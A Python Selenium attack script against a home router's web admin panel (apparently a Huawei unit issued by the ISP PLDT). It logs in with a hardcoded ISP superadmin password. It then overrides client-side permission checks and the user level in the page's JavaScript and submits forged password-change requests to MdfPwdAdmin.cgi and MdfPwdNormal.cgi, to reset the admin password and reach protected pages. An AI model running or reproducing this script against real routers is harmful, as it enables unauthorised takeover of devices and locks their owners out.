#!/usr/bin/env python3
"""Use webSubmitForm to actually navigate browser to MdfPwdAdmin.cgi."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--incognito")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver

driver = setup_driver()
try:
    # 1. Login as superadmin
    print("1. Login as adminpldt with forced Userlevel=2...")
    driver.get(ROUTER + "/admin.html")
    time.sleep(5)
    driver.execute_script("window.CheckPassword = function(pwd) { return 2; }; window.setDisable = function() {};")
    u = driver.find_element(By.ID, "txt_Username")
    p = driver.find_element(By.ID, "txt_Password")
    driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
    u.send_keys("adminpldt")
    p.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
    driver.execute_script("document.getElementById('button').style.display = '';")
    driver.find_element(By.ID, "button").click()
    time.sleep(5)
    lvl = driver.execute_script("return window.Userlevel;")
    print("   Userlevel:", lvl)

    # Skip form
    driver.execute_script("""
        document.getElementById('base_mask').style.display = 'none';
        document.getElementById('pwd_modify').style.display = 'none';
    """)

    new_pwd = "Admin9999"
    old_pwd = "AC2DIU7QW3ERTY6UPAS4DFG"

    # 2. Use webSubmitForm to navigate to MdfPwdAdmin.cgi
    print("\n2. Using webSubmitForm to submit to MdfPwdAdmin.cgi...")
    js = """
        var token = null;
        $.ajax({type:'POST', async:false, cache:false, url:'/asp/GetRandCount.asp',
            success: function(d) { token = d; }});

        var Form = new webSubmitForm();
        Form.addParameter('z.Password', arguments[0]);
        Form.addParameter('z.OldPassword', arguments[1]);
        Form.addParameter('z.Language', 'english');
        Form.addParameter('x.X_HW_Token', token);
        Form.setAction('MdfPwdAdmin.cgi?z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2&RequestFile=admin.html');
        Form.submit();
    """
    driver.execute_script(js, new_pwd, old_pwd)
    time.sleep(8)

    url = driver.current_url
    has_login = "txt_Username" in driver.page_source
    print("   URL:", url)
    print("   Has login form:", has_login)

    # Check what page we're on
    try:
        text = driver.execute_script("return document.body ? document.body.innerText.substring(0, 500) : '';")
        print("   Text:", text[:300])
    except:
        print("   (page may have navigated)")

    # If we're on admin.html, check if session was created
    if "admin.html" in url and not has_login:
        print("\n   We're on admin.html without login form!")
        lvl2 = driver.execute_script("try { return window.Userlevel; } catch(e) { return 'err'; }")
        print("   Userlevel:", lvl2)

        # Try accessing protected pages
        for pg in ["/html/amp/wlanbasic/WlanBasic.asp?2G",
                    "/html/ssmp/info/basic/system_info.asp"]:
            r = driver.execute_script("""
                var r = null;
                $.ajax({type:'GET', async:false, cache:false, url: arguments[0],
                    success: function(d) { r = {ok: true, data: String(d).substring(0, 300)}; },
                    error: function(xhr) { r = {ok: false, code: xhr.status}; }
                });
                return r;
            """, pg)
            print("   " + pg + " -> " + ("OK:" + r.get("data", "")[:100] if r.get("ok") else str(r)))

    elif has_login:
        print("\n   Still on login form. Trying admin:" + new_pwd + "...")
        u2 = driver.find_element(By.ID, "txt_Username")
        p2 = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value=''; arguments[1].value='';", u2, p2)
        u2.send_keys("admin")
        p2.send_keys(new_pwd)
        driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
        driver.execute_script("document.getElementById('button').style.display='';")
        driver.find_element(By.ID, "button").click()
        time.sleep(5)
        has_login2 = "txt_Username" in driver.page_source
        print("   admin:" + new_pwd + " -> login:", has_login2)
        if not has_login2:
            print("   *** PASSWORD CHANGE WORKED! ***")

    # 3. Also try with admin domain (X_HW_WebUserInfo.1)
    print("\n3. Trying MdfPwdAdmin.cgi with admin domain (Userlevel=1)...")
    driver.get(ROUTER + "/admin.html")
    time.sleep(5)
    driver.execute_script("window.CheckPassword = function(pwd) { return 2; }; window.setDisable = function() {};")
    u = driver.find_element(By.ID, "txt_Username")
    p = driver.find_element(By.ID, "txt_Password")
    driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
    u.send_keys("adminpldt")
    p.send_keys(old_pwd)
    driver.execute_script("document.getElementById('button').style.display = '';")
    driver.find_element(By.ID, "button").click()
    time.sleep(5)

    # Now force Userlevel=1 (admin) and try MdfPwdNormal.cgi
    driver.execute_script("""
        window.Userlevel = 1;
        document.getElementById('base_mask').style.display = 'none';
        document.getElementById('pwd_modify').style.display = 'none';
    """)
    time.sleep(1)

    js2 = """
        var token = null;
        $.ajax({type:'POST', async:false, cache:false, url:'/asp/GetRandCount.asp',
            success: function(d) { token = d; }});

        var Form = new webSubmitForm();
        Form.addParameter('z.Password', arguments[0]);
        Form.addParameter('z.OldPassword', arguments[1]);
        Form.addParameter('z.Language', 'english');
        Form.addParameter('x.X_HW_Token', token);
        Form.setAction('MdfPwdNormal.cgi?z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1&RequestFile=admin.html');
        Form.submit();
    """
    driver.execute_script(js2, new_pwd, old_pwd)
    time.sleep(8)

    url = driver.current_url
    has_login = "txt_Username" in driver.page_source
    print("   URL:", url, "login:", has_login)
    if has_login:
        print("   Trying admin:" + new_pwd + "...")
        u2 = driver.find_element(By.ID, "txt_Username")
        p2 = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value=''; arguments[1].value='';", u2, p2)
        u2.send_keys("admin")
        p2.send_keys(new_pwd)
        driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
        driver.execute_script("document.getElementById('button').style.display='';")
        driver.find_element(By.ID, "button").click()
        time.sleep(5)
        has_login2 = "txt_Username" in driver.page_source
        print("   admin:" + new_pwd + " -> login:", has_login2)
        if not has_login2:
            print("   *** PASSWORD CHANGE WORKED! ***")

finally:
    driver.quit()
